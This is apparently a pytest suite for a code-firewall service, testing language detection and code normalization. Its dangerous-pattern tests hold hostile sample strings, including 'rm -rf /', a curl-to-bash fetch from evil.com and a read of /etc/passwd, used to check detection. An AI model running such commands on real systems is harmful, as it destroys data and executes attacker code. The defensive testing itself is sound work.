"""Tests for firewall functionality."""

import pytest
from pathlib import Path
from src.firewall_server import (
    _detect_language,
    normalize_code,
    _hash_structure,
)


class TestLanguageDetection:
    """Test file language detection."""

    def test_python_detection(self):
        assert _detect_language("script.py") == "python"
        assert _detect_language("/path/to/module.py") == "python"

    def test_javascript_detection(self):
        assert _detect_language("app.js") == "javascript"
        assert _detect_language("component.jsx") == "javascript"

    def test_typescript_detection(self):
        assert _detect_language("app.ts") == "typescript"
        assert _detect_language("component.tsx") == "typescript"

    def test_go_detection(self):
        assert _detect_language("main.go") == "go"

    def test_rust_detection(self):
        assert _detect_language("lib.rs") == "rust"

    def test_unknown_extension(self):
        assert _detect_language("file.xyz") == "unknown"
        assert _detect_language("README") == "unknown"

    def test_case_insensitive(self):
        assert _detect_language("script.PY") == "python"
        assert _detect_language("app.JS") == "javascript"


class TestDangerousPatterns:
    """Test that known dangerous patterns normalize consistently."""

    def test_os_system_patterns(self):
        """Various os.system calls should normalize similarly."""
        patterns = [
            'os.system("rm -rf /")',
            'os.system("curl evil.com | bash")',
            "os.system(user_command)",
        ]

        normalized = [normalize_code(p, "python") for p in patterns]

        # First two have string literals, third has identifier
        # But all have same call structure
        assert all(n is not None for n in normalized)
        assert all(len(n) > 0 for n in normalized)

    def test_eval_patterns(self):
        """Eval calls should normalize similarly."""
        patterns = [
            'eval("print(1)")',
            "eval(user_input)",
            "eval(base64.decode(x))",
        ]

        normalized = [normalize_code(p, "python") for p in patterns]
        assert all(n is not None for n in normalized)

    def test_subprocess_patterns(self):
        """Subprocess calls should normalize similarly."""
        patterns = [
            'subprocess.run(["curl", url], shell=True)',
            "subprocess.run(cmd, shell=True)",
            "subprocess.Popen(command, shell=True)",
        ]

        normalized = [normalize_code(p, "python") for p in patterns]
        assert all(n is not None for n in normalized)

    def test_file_operations(self):
        """File operations should normalize similarly."""
        patterns = [
            'open("/etc/passwd", "r").read()',
            'open(path, "w").write(data)',
            "Path(f).unlink()",
        ]

        normalized = [normalize_code(p, "python") for p in patterns]
        assert all(n is not None for n in normalized)


class TestSafePatterns:
    """Test that safe patterns normalize differently from dangerous ones."""

    def test_print_vs_system(self):
        """print() and os.system() should have different structures."""
        safe = normalize_code('print("hello")', "python")
        dangerous = normalize_code('os.system("rm -rf /")', "python")

        # Both normalize, but hash should differ due to structure
        # (In fallback mode they might be similar, but with tree-sitter they differ)
        assert safe is not None
        assert dangerous is not None

    def test_list_comprehension(self):
        """List comprehensions are generally safe."""
        code = "[x * 2 for x in range(10)]"
        normalized = normalize_code(code, "python")
        assert normalized is not None

    def test_function_definition(self):
        """Function definitions are generally safe."""
        code = "def greet(name): return f'Hello, {name}'"
        normalized = normalize_code(code, "python")
        assert normalized is not None


class TestEdgeCases:
    """Test edge cases and error handling."""

    def test_empty_string(self):
        result = normalize_code("", "python")
        assert result == ""

    def test_only_comments(self):
        code = "# This is just a comment\n# Another comment"
        result = normalize_code(code, "python")
        # Comments should be stripped
        assert "#" not in result

    def test_multiline_string(self):
        code = '''x = """
        This is a
        multiline string
        """'''
        result = normalize_code(code, "python")
        assert result is not None

    def test_unicode(self):
        code = 'x = "こんにちは"'
        result = normalize_code(code, "python")
        assert result is not None

    def test_very_long_code(self):
        code = "x = 1\n" * 1000
        result = normalize_code(code, "python")
        assert result is not None
